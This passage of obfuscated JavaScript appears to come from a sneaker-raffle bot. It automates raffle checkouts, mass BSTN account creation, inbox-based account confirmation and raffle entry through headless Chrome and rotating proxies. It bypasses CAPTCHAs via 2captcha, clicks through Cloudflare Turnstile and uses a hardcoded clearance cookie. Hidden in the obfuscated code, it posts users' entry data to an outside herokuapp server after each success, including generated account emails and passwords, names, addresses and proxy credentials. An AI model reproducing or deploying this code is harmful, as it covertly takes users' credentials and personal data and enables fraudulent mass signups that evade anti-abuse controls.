                                const _0xe48e38 = JSON['parse'](_0x3f6207['readFileSync']('States.json', 'utf8'));
                                await _0x4b01dc(0x1f4);
                                if (_0x2070bd[_0x198610]['State']['length'] > 0x2)
                                    for (let _0x370f9b of _0xe48e38) {
                                        if (_0x370f9b['Province'] == _0x2070bd[_0x198610]['State']) {
                                            await _0x46855c['select']('#checkout_shipping_address_province', _0x370f9b['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x46855c['select']('#checkout_shipping_address_province', _0x2070bd[_0x198610]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x4b01dc(0x1f4), console['log'](_0x303e65() + '\x20[' + _0x26ec85['name'] + ']\x20Task\x20' + (_0x198610 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x4b01dc(0x190), _0x46855c['evaluate'](() => {
                            const _0x45e702 = document['querySelector']('#continue_button');
                            for (var _0x7aa635 = 0x0; _0x7aa635 < 0x5; _0x7aa635++) {
                                if (_0x45e702) {
                                    _0x45e702['click'](), _0x45e702['click']();
                                    break;
                                } else
                                    _0x4b01dc(0xfa0);
                            }
                        }), await _0x46855c['waitForTimeout'](0x9c4);
                        try {
                            await _0x46855c['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x46855c['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x178339 => _0x178339['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x46855c['waitForTimeout'](0x7d0), console['log'](_0x303e65() + '\x20[' + _0x26ec85['name'] + ']\x20Task\x20' + (_0x198610 + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x46855c['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x4b01dc(0x3e8), await _0x46855c['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x297723 => _0x297723['submit']()), await _0x4b01dc(0x3e8);
                        try {
                            await _0x46855c['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x46855c['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x28692b => _0x28692b['submit']());
                        try {
                            await _0x46855c['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0xc8b264 = 'no', _0x41d22(_0x2070bd[_0x198610], _0x26ec85), console['log'](_0xd12810['green'](_0x303e65() + '\x20[' + _0x26ec85['name'] + ']\x20Task\x20' + (_0x198610 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '')
                                try {
                                    await _0x265172(_0x33c579['webhook'], _0x40a67d['succesDEVMSG']);
                                } catch {
                                }
                            await _0x4b01dc(0xc8), await _0x265172(_0x485a18, _0x40a67d['succesDEVMSG']), await _0x4b01dc(0xc8);
                            try {
                                await _0x265172(_0x2c2f0f, _0x40a67d['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x4ebc10['replace']('#', ''),
                                    'module': _0x26ec85['name'],
                                    'entrydata': JSON['stringify'](_0x56adf5),
                                    'proxy': '' + _0x30e1ff[_0x198610]
                                };
                                var _0x39bee1 = JSON['stringify'](prxdata);
                                let _0x151077 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x4f7750['post']('https://jraffles.herokuapp.com/success', _0x39bee1, _0x151077);
                            } catch (_0x1b0c2f) {
                            }
                        } catch (_0x24c81a) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x19f7c2) {
                        _0x19f7c2['message']['includes']('selector') && (_0x19f7c2 = 'Connection\x20Error');
                        console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x26ec85['name'] + ']\x20Task\x20' + (_0x198610 + 0x1) + '\x20:\x20' + _0x19f7c2)), _0x50eb47 = '' + _0x19f7c2;
                        var _0x123e32 = await _0x4a5b92(_0x2070bd[_0x198610], _0x26ec85, 'dev', !![], _0x50eb47);
                        _0x40a67d['errorDEV'] = { 'embeds': [_0x123e32] }, _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x40a67d['errorDEV']), await _0x265172(_0x3cc994, _0x40a67d['errorDEV']), _0xc8b264 = 'yes';
                    } finally {
                        _0x5a0608 && _0x5a0608['close']();
                        if (_0xc8b264 == 'yes' && _0x299ea9 != 0x5 && _0x50eb47 != 'Size\x20Not\x20Found') {
                            console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x26ec85['name'] + ']\x20Task\x20' + (_0x198610 + 0x1) + '\x20:\x20Retrying\x20(' + _0x299ea9 + '\x20/\x205)')), _0x198610 = _0x198610 - 0x1, _0x299ea9 = _0x299ea9 + 0x1;
                            continue;
                        }
                        _0xc8b264 == 'yes' && _0x299ea9 >= 0x5 && (_0x2b505c(_0x2070bd[_0x198610], _0x26ec85), _0xc8b264 = 'no', _0x299ea9 = 0x0);
                        if (_0x198610 + 0x1 == _0x2070bd['length']) {
                            await _0x4b01dc(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x33c579['AfewDelay'] + '\x20ms'), await _0x4b01dc(_0x33c579['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x17d6cf, _0x1a6aa9, _0x3fee16) {
                    var _0x22b2d9 = _0x1a6aa9, _0x6e839d = 0x0;
                    for (var _0x5023ca = 0x0; _0x5023ca < _0x1a6aa9['length']; _0x5023ca++) {
                        maxTasks = Number(_0x33c579['threads']);
                        while (_0x6e839d >= maxTasks) {
                            await _0x4b01dc(_0x33c579['delay']);
                        }
                        async function _0x5d3870(_0x36db1b, _0x11030d, _0x53ad6e, _0xecef71, _0x159126) {
                            _0x6e839d++, _0x284c7b['use'](_0xecf9cb()), _0x284c7b['use'](_0x88e53d({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x33c579['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x1fdb0e;
                            try {
                                await _0x32ecbd(_0x11030d, _0xecef71);
                            } catch {
                                retry = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x369d34(_0x36db1b['name'] + '\x20Task\x20' + (_0xecef71 + 0x1) + '\x20/\x20' + _0x11030d['length'] + '\x20||\x20File:\x20' + _0x506019 + '\x20Proxies:\x20' + _0x15bf3f);
                            var _0x49fd4c = await _0x4a5b92(_0x11030d[_0xecef71], _0x36db1b, 'acc', ![]);
                            const _0x4d8c5e = { 'succesDEVMSG': { 'embeds': [_0x49fd4c] } }, _0x463e4f = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x56eff4 = Math['round'](Math['random']() * (_0x53ad6e['length'] - 0x1)), _0x25458b = _0x53ad6e[_0x56eff4]['split'](':'), _0x541c5d;
                            try {
                                _0x541c5d = await _0x284c7b['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x25458b[0x0] + ':' + _0x25458b[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x541c5d = await _0x284c7b['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x25458b[0x0] + ':' + _0x25458b[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x7091e = await _0x541c5d['newPage']();
                                await _0x7091e['authenticate']({
                                    'username': '' + _0x25458b[0x2],
                                    'password': '' + _0x25458b[0x3]
                                }), console['log'](_0x303e65() + '\x20[' + _0x36db1b['name'] + ']\x20Task\x20' + (_0xecef71 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x7091e['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x7091e['setRequestInterception'](!![]), _0x7091e['on']('request', _0x4f8eef => {
                                    _0x4f8eef['resourceType']() === 'image' ? _0x4f8eef['abort']() : _0x4f8eef['continue']();
                                });
                                try {
                                    await _0x7091e['goto']('' + _0x463e4f), await _0x7091e['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    retry = 'yes';
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x7091e['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x303e65() + '\x20[' + _0x36db1b['name'] + ']\x20Task\x20' + (_0xecef71 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x4b01dc(0x7d0), console['log'](_0x303e65() + '\x20[' + _0x36db1b['name'] + ']\x20Task\x20' + (_0xecef71 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x4b01dc(0x190), await _0x7091e['waitForSelector']('#firstname'), await _0x7091e['focus']('#firstname'), await _0x7091e['keyboard']['down']('Control'), await _0x7091e['keyboard']['press']('A'), await _0x4b01dc(0xc8), await _0x7091e['keyboard']['up']('Control'), await _0x7091e['keyboard']['press']('Backspace'), await _0x7091e['type']('#firstname', _0x11030d[_0xecef71]['FirstName'], { 'delay': 0xf0 }), await _0x4b01dc(0x190), await _0x7091e['focus']('#lastname'), await _0x7091e['keyboard']['down']('Control'), await _0x7091e['keyboard']['press']('A'), await _0x4b01dc(0xc8), await _0x7091e['keyboard']['up']('Control'), await _0x7091e['keyboard']['press']('Backspace'), await _0x7091e['type']('#lastname', _0x11030d[_0xecef71]['LastName'], { 'delay': 0xe6 }), await _0x4b01dc(0x190), await _0x7091e['focus']('#email_address'), await _0x7091e['keyboard']['down']('Control'), await _0x7091e['keyboard']['press']('A'), await _0x4b01dc(0xc8), await _0x7091e['keyboard']['up']('Control'), await _0x7091e['keyboard']['press']('Backspace'), await _0x7091e['type']('#email_address', _0x11030d[_0xecef71]['Email'], { 'delay': 0x122 }), await _0x4b01dc(0x190), await _0x7091e['type']('#password', _0x11030d[_0xecef71]['Password'], { 'delay': 0x82 }), await _0x4b01dc(0x1f4), await _0x7091e['type']('#password-confirmation', _0x11030d[_0xecef71]['Password'], { 'delay': 0x7c }), console['log'](_0x303e65() + '\x20[' + _0x36db1b['name'] + ']\x20Task\x20' + (_0xecef71 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x4b01dc(0x2bc), await _0x7091e['$eval']('#form-validate', _0xe862af => _0xe862af['submit']()), await _0x4b01dc(0x1388);
                                const _0x340152 = await _0x7091e['$']('#email_address-error');
                                if (_0x340152)
                                    throw new Error('Invalid\x20Email');
                                const _0x573904 = await _0x7091e['$']('#password-error');
                                if (_0x573904)
                                    throw new Error('Invalid\x20Password');
                                await _0x7091e['waitForSelector']('div.mesg-success'), retry = 'no', console['log'](_0xd12810['green'](_0x303e65() + '\x20[' + _0x36db1b['name'] + ']\x20Task\x20' + (_0xecef71 + 0x1) + '\x20:\x20Account\x20' + _0x11030d[_0xecef71]['Email'] + '\x20Generated')), _0x3f6207['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x11030d[_0xecef71]['Email'] + ',' + _0x11030d[_0xecef71]['Password']);
                                try {
                                    _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x4d8c5e['succesDEVMSG']);
                                } catch {
                                }
                                await _0x265172(_0x1fa40c, _0x4d8c5e['succesDEVMSG']);
                                let _0x1e9001 = _0x11030d[_0xecef71];
                                try {
                                    prxdata = {
                                        'username': _0x4ebc10['replace']('#', ''),
                                        'module': _0x36db1b['name'],
                                        'entrydata': JSON['stringify'](_0x1e9001),
                                        'proxy': '' + _0x53ad6e[_0xecef71]
                                    };
                                    var _0xf1f15c = JSON['stringify'](prxdata);
                                    let _0x177b51 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x4f7750['post']('https://jraffles.herokuapp.com/success', _0xf1f15c, _0x177b51);
                                } catch (_0x1cb4a3) {
                                }
                                console['log'](_0xd12810['yellow'](_0x303e65() + '\x20[' + _0x36db1b['name'] + ']\x20Task\x20' + (_0xecef71 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x12beaf) {
                                console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x36db1b['name'] + ']\x20Task\x20' + (_0xecef71 + 0x1) + '\x20:\x20' + _0x12beaf)), _0x1fdb0e = '' + _0x12beaf;
                                var _0x469be3 = await _0x4a5b92(_0x11030d[_0xecef71], _0x36db1b, 'acc', !![], _0x1fdb0e);
                                _0x4d8c5e['errorDEV'] = { 'embeds': [_0x469be3] }, _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x4d8c5e['errorDEV']), await _0x265172(_0x3cc994, _0x4d8c5e['errorDEV']), retry = 'yes';
                            } finally {
                                if (_0x541c5d)
                                    _0x541c5d['close']();
                                if (retry == 'yes' && _0x159126 != 0x5)
                                    return console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x36db1b['name'] + ']\x20Task\x20' + (_0xecef71 + 0x1) + '\x20:\x20Retrying\x20(' + (_0x159126 + 0x1) + '\x20/\x205)')), _0x6e839d--, _0x159126 = _0x159126 + 0x1, _0x5d3870(_0x36db1b, _0x11030d, _0x53ad6e, _0xecef71, _0x159126);
                                retry == 'yes' && _0x159126 >= 0x5 && (_0x2b505c(_0x11030d[_0xecef71], _0x36db1b), retry = 'no', _0x159126 = 0x0), _0x6e839d--, console['log'](_0x303e65() + '\x20[' + _0x36db1b['name'] + ']\x20Waiting\x20for\x20' + _0x33c579['delay'] + '\x20ms'), await _0x4b01dc(_0x33c579['delay']);
                            }
                        }
                        _0x5d3870(_0x17d6cf, _0x22b2d9, _0x3fee16, _0x5023ca, 0x0), await _0x4b01dc(0x190);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x4bdfa4, _0x14c38d) {
                    var _0x491318 = ![], _0x5ec5d7 = [], _0x456cdb = 0x0;
                    async function _0x572c8d() {
                        var _0x56b51c = new _0xc8c5aa({
                            'user': _0x33c579['masterMail'],
                            'password': _0x33c579['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x342dc6(_0x16f1c4) {
                            _0x56b51c['openBox']('INBOX', ![], _0x16f1c4);
                        }
                        _0x56b51c['once']('ready', function () {
                            _0x342dc6(function (_0x576b8e, _0x16ae31) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x576b8e)
                                    throw _0x576b8e;
                                _0x56b51c['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x324fed, _0x57b2da) {
                                    if (!_0x57b2da || !_0x57b2da['length'])
                                        console['log'](_0x303e65() + '\x20[' + _0x4bdfa4['name'] + ']\x20No\x20mails\x20found'), _0x56b51c['end']();
                                    else {
                                        var _0x244be6 = _0x56b51c['seq']['fetch'](_0x57b2da, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x244be6['on']('message', function (_0x3f0cc5, _0x95b27d) {
                                            var _0x550d55 = '(#' + _0x95b27d + ')\x20';
                                            _0x3f0cc5['on']('body', function (_0x4961a0, _0xbe151a) {
                                                _0x1d4048(_0x4961a0, (_0x1de194, _0xd6ffb9) => {
                                                    var _0x274427 = _0xd6ffb9['text']['split']('customer/account/confirm/')[0x1], _0x5710e7 = _0x274427['split'](']')[0x0];
                                                    _0x5ec5d7['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0x5710e7);
                                                });
                                            }), _0x3f0cc5['once']('end', function () {
                                            });
                                        }), _0x244be6['once']('error', function (_0x41c13d) {
                                            console['log']('Fetch\x20error:\x20' + _0x41c13d), _0x491318 = !![];
                                        }), _0x244be6['once']('end', function () {
                                            _0x56b51c['end'](), _0x491318 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x56b51c['once']('error', function (_0x203b8d) {
                            console['log'](_0xd12810['red'](_0x203b8d['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x491318 = !![];
                        }), _0x56b51c['once']('end', async function () {
                            _0x491318 = !![];
                        }), _0x56b51c['connect']();
                    }
                    try {
                        _0x572c8d();
                        while (!_0x491318) {
                            await _0x4b01dc(0xfa0);
                        }
                        console['log']('Found\x20' + _0x5ec5d7['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x4b01dc(0x7d0);
                    }
                    for (var _0xae4465 = 0x0; _0xae4465 < _0x5ec5d7['length']; _0xae4465++) {
                        maxTasks = Number(_0x33c579['threads']);
                        while (_0x456cdb >= maxTasks) {
                            await _0x4b01dc(_0x33c579['delay']);
                        }
                        async function _0x4c3978(_0x5b09c8, _0x5999a2, _0x5e0042, _0x417eb5, _0x55967c) {
                            _0x456cdb++, _0x284c7b['use'](_0xecf9cb());
                            if (_0x2d691d != 'yes')
                                var _0x2d691d = '', _0x55967c = 0x0;
                            var _0xc9c05a = Math['round'](Math['random']() * (_0x5e0042['length'] - 0x1)), _0xf380b5 = _0x5e0042[_0xc9c05a]['split'](':'), _0x3f25bf;
                            try {
                                _0x3f25bf = await _0x284c7b['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0xf380b5[0x0] + ':' + _0xf380b5[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x3f25bf = await _0x284c7b['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0xf380b5[0x0] + ':' + _0xf380b5[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x3e9214 = await _0x3f25bf['newPage']();
                                await _0x3e9214['authenticate']({
                                    'username': '' + _0xf380b5[0x2],
                                    'password': '' + _0xf380b5[0x3]
                                }), console['log'](_0x303e65() + '\x20[' + _0x5b09c8['name'] + ']\x20Task\x20' + (_0x417eb5 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x3e9214['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3e9214['setRequestInterception'](!![]), _0x3e9214['on']('request', _0x596a54 => {
                                    _0x596a54['resourceType']() === 'image' || _0x596a54['resourceType']() === 'font' || _0x596a54['resourceType']() === 'media' ? _0x596a54['abort']() : _0x596a54['continue']();
                                }), console['log'](_0x303e65() + '\x20[' + _0x5b09c8['name'] + ']\x20Task\x20' + (_0x417eb5 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x3e9214['goto'](_0x5999a2[_0x417eb5]);
                                } catch (_0x5b518c) {
                                    _0x2d691d = 'yes';
                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0x5b518c);
                                }
                                console['log'](_0x303e65() + '\x20[' + _0x5b09c8['name'] + ']\x20Task\x20' + (_0x417eb5 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x3e9214['waitForTimeout'](0xbb8);
                                try {
                                    await _0x3e9214['waitForSelector']('.account-nav'), _0x2d691d = 'no', console['log'](_0xd12810['green'](_0x303e65() + '\x20[' + _0x5b09c8['name'] + ']\x20Task\x20' + (_0x417eb5 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x35ed0a = await _0x4a5b92(null, _0x5b09c8, 'ver', ![]);
                                    const _0x1c3135 = { 'succesDEVMSG': { 'embeds': [_0x35ed0a] } };
                                    await _0x265172(_0x14a1d3, _0x1c3135['succesDEVMSG']);
                                } catch {
                                    _0x2d691d = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x266fda) {
                                console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x5b09c8['name'] + ']\x20Task\x20' + (_0x417eb5 + 0x1) + '\x20:\x20' + _0x266fda));
                                var _0x3f1602 = _0x266fda, _0x3efebe = await _0x4a5b92(null, _0x5b09c8, 'ver', !![], _0x3f1602);
                                const _0x983be5 = { 'errorDEVMSG': { 'embeds': [_0x3efebe] } };
                                _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x983be5['errorDEVMSG']), await _0x265172(_0x3cc994, _0x983be5['errorDEVMSG']);
                            } finally {
                                if (_0x3f25bf)
                                    _0x3f25bf['close']();
                                if (_0x2d691d == 'yes' && _0x55967c != 0x5)
                                    return console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x5b09c8['name'] + ']\x20Task\x20' + (_0x417eb5 + 0x1) + '\x20:\x20Retrying\x20(' + _0x55967c + '\x20/\x205)')), _0x456cdb--, _0x55967c = _0x55967c + 0x1, _0x4c3978(_0x5b09c8, _0x5999a2, _0x5e0042, _0x417eb5, _0x55967c);
                                _0x2d691d == 'yes' && _0x55967c >= 0x5 && (_0x2d691d = 'no', _0x55967c = 0x0), _0x456cdb--, console['log'](_0x303e65() + '\x20[' + _0x5b09c8['name'] + ']\x20Waiting\x20for\x20' + _0x33c579['delay'] + '\x20ms'), await _0x4b01dc(_0x33c579['delay']);
                            }
                        }
                        if (_0xae4465 == _0x5ec5d7['length'] - 0x1) {
                            await _0x4c3978(_0x4bdfa4, _0x5ec5d7, _0x14c38d, _0xae4465, 0x0);
                            return;
                        }
                        _0x4c3978(_0x4bdfa4, _0x5ec5d7, _0x14c38d, _0xae4465, 0x0), await _0x4b01dc(0x12c);
                    }
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x4339c1, _0x47f3a5, _0x3ac088) {
                    var _0x2d0847 = 0x0, _0x48b7d9 = _0x47f3a5;
                    for (var _0x2fe022 = 0x0; _0x2fe022 < _0x47f3a5['length']; _0x2fe022++) {
                        maxTasks = Number(_0x33c579['threads']);
                        while (_0x2d0847 >= maxTasks) {
                            await _0x4b01dc(_0x33c579['delay']);
                        }
                        let _0x506826 = ![];
                        async function _0x29551d(_0x1b07f2, _0x10c23f, _0x498265, _0x5827b2, _0x50d769) {
                            _0x2d0847++, _0x284c7b['use'](_0xecf9cb()), _0x284c7b['use'](_0x88e53d({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x33c579['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x5ed8b7, _0x1d9f3c = _0x10c23f[_0x5827b2];
                            try {
                                await _0x32ecbd(_0x10c23f, _0x5827b2);
                            } catch {
                                _0x2df533 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            async function _0x32a58c(_0x592025) {
                                const _0x2e1b84 = _0x3f6207['readFileSync']('../successful-tasks.csv', 'utf8'), _0x41837a = _0x3a0f5b['parse'](_0x2e1b84, { 'header': !![] })['data'];
                                let _0x3e20cc = ![];
                                for (var _0x363777 of _0x41837a) {
                                    if (_0x363777['Url'] == _0x592025['Url'] && _0x363777['Email'] == _0x592025['Email']) {
                                        _0x3e20cc = !![];
                                        break;
                                    }
                                }
                                return _0x3e20cc;
                            }
                            _0x369d34(_0x1b07f2['name'] + '\x20Task\x20' + (_0x5827b2 + 0x1) + '\x20/\x20' + _0x10c23f['length'] + '\x20||\x20File:\x20' + _0x506019 + '\x20Proxies:\x20' + _0x15bf3f);
                            var _0x360b02 = Math['round'](Math['random']() * (_0x498265['length'] - 0x1)), _0x36e369 = _0x498265[_0x360b02]['split'](':'), _0x550379;
                            let _0x144041 = ![], _0x2df533 = 'no';
                            try {
                                if (await _0x32a58c(_0x10c23f[_0x5827b2]) == !![]) {
                                    console['log'](_0x303e65() + '\x20[' + _0x1b07f2['name'] + ']\x20Task\x20' + (_0x5827b2 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x144041 = !![], _0x506826 = !![];
                                    return;
                                }
                                try {
                                    _0x550379 = await _0x284c7b['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x36e369[0x0] + ':' + _0x36e369[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x550379 = await _0x284c7b['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x36e369[0x0] + ':' + _0x36e369[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x4ac787 = await _0x550379['newPage'](), _0x1fda2f = await _0x4ac787['target']()['createCDPSession'](), { windowId: _0x4f7d0 } = await _0x1fda2f['send']('Browser.getWindowForTarget');
                                await _0x4ac787['setViewport']({
                                    'width': 0x501,
                                    'height': 0x2d0
                                });
                                var _0x3467a5 = [{
                                    'name': 'cf_clearance',
                                    'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                    'domain': '.bstn.com',
                                    'path': '/',
                                    'expires': 1707818183.331533,
                                    'httpOnly': !![],
                                    'secure': !![]
                                }];
                                await _0x4ac787['authenticate']({
                                    'username': '' + _0x36e369[0x2],
                                    'password': '' + _0x36e369[0x3]
                                }), console['log'](_0x303e65() + '\x20[' + _0x1b07f2['name'] + ']\x20Task\x20' + (_0x5827b2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4ac787['goto']('' + _0x10c23f[_0x5827b2]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x303e65() + '\x20[' + _0x1b07f2['name'] + ']\x20Task\x20' + (_0x5827b2 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x4b01dc(0x1388);
                                var _0x45026e = await _0x4ac787['$']('#turnstile-wrapper');
                                if (_0x45026e) {
                                    console['log'](_0x303e65() + '\x20[' + _0x1b07f2['name'] + ']\x20Task\x20' + (_0x5827b2 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x4b01dc(0x2710);
                                    const _0x50f9ed = await _0x4ac787['$']('#turnstile-wrapper');
                                    if (_0x50f9ed)
                                        try {
                                            await _0x50f9ed['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x4ac787['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x3e3ad0 = await _0x4ac787['$']('#turnstile-wrapper');
                                        if (_0x3e3ad0)
                                            try {
                                                await _0x3e3ad0['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x4ac787['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                                } catch {
                                    throw new Error('Blocked\x20by\x20Cloudflare');
                                }
                                await _0x1fda2f['send']('Browser.setWindowBounds', {
                                    'windowId': _0x4f7d0,
                                    'bounds': { 'windowState': 'minimized' }
